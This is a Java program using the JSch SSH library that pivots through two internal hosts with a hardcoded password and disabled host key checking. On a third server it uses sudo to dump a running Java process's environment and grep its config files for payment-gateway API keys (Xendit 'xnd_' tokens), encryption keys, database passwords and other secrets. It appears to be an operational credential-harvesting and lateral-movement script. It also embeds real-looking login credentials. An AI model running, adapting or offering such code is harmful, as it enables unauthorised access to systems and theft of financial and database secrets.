import com.jcraft.jsch.*;
import java.io.*;
class XSN {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    // From Sentry, SSH to Accurate server
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'hostname;id;echo ---JVM---;ps aux | grep java | grep -v grep | head -2;echo ---PROCS-ENV---;echo kutul0nc4t | sudo -S cat /proc/$(pgrep -f accurate | head -1)/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"xnd_\\|xendit\\|ACC_ENC\\|ENC_\\|db\\.pass\\|SECRET\";echo ---CONFIG---;grep -r \"xnd_\\|xendit\" /progs/accurate/*/webapps/*/WEB-INF/classes/*.properties 2>/dev/null | head -10;echo ---ALL-PROGS---;ls /progs/ 2>/dev/null' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
